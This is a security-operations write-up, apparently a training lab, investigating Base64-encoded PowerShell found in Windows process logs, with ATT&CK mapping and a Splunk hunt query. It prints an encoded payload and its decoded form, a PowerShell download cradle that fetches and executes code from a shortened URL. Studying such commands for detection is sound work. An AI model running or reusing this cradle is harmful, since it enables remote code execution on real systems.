# 🚨 Scenario 1: Encoded PowerShell Execution Analysis

## 📌 Incident Overview
During threat hunting operations within Windows process execution logs, suspicious PowerShell commands utilizing Base64 encoding parameters (`-enc`, `-encodedcommand`) were detected. Attackers frequently utilize encoded commands to obscure malicious payloads, evade basic string-matching detection rules, and download secondary stagers from remote infrastructure.

---

## 🎯 MITRE ATT&CK Mapping

* **Tactic:** Execution ([TA0002](https://attack.mitre.org/tactics/TA0002/))
* **Technique:** Command and Scripting Interpreter: PowerShell ([T1059.001](https://attack.mitre.org/techniques/T1059/001/))
* **Technique:** Deobfuscate/Decode Files or Information ([T1140](https://attack.mitre.org/techniques/T1140/))

---

## 📋 Key Investigation Findings

* **Target Hosts Identified:**
  * `FYODOR-L` (114 events)
  * `ABUNGST-L` (29 events)
  * `BSTOLL-L` (4 events)
* **Execution Timestamp:** August 20, 2018 (11:57:15 AM UTC)
* **Executing Account:** `Users\AlBungstein`
* **Raw Obfuscated Payload:**
  `aQB1AHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwBlADBNAHcAOQB3ACIAKQBhA=`
* **Decoded Payload (Deobfuscated):**
  `iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")`
* **Threat Impact:** **High** — The decoded command invokes `Invoke-Expression` (`iex`) to download and execute an external payload into memory from a shortened URL (`http://bit.ly/e0Mw9w`).

---

## 🔍 Investigation Walkthrough

### Phase 1: Hunting for Encoded Commands

A hunt query was executed across the `botsv3` index targeting process execution logs containing common PowerShell encoding flags.

```spl
index=botsv3 powershell (*-enc* OR *-encodedcommand* OR *-e *)
